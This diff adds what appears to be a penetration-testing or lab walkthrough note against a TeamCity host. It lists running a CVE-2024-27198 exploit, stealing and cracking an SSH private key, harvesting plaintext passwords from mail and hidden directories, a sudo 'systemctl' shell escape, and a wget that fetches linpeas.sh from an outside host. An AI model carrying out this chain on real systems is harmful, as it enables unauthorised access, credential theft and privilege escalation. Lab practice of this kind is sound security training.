@@ -1,0 +1,73 @@
+Scurity
+192.168.245.91
+
+
+teamcity 2023.05.4  exploit
+
+https://github.com/yoryio/CVE-2024-27198
+
+python3 CVE-2024-27198.py -t http://teams.onlyrands.com -u admin -p password
+login with new username and password
+
+Teamcity logged in
+Projects > Marco Tillman >oops > id_rsa
+
+Copry id_rsa
+ssh marcot@192.168.245.91 -i id_rsa (faild asking for password)
+ssh2john id_rsa >hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+got password 
+logged in successful
+
+Tried linpeas.sh
+
+cd /var/mail
+cat  marcot
+
+got password for matthew
+IdealismEngineAshen476
+sudo -l no luck
+
+change to home directory 
+found 1 hidden directory .~
+
+Got password for Dach's
+RefriedScabbedWasting502
+
+no user found
+this password belongs to briand
+
+logged in 
+sudo -l 
+/usr/bin/systemctl status teamcity-server.service
+
+!sh
+
+
+wget http://192.168.45.173:440/linpeas.sh
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
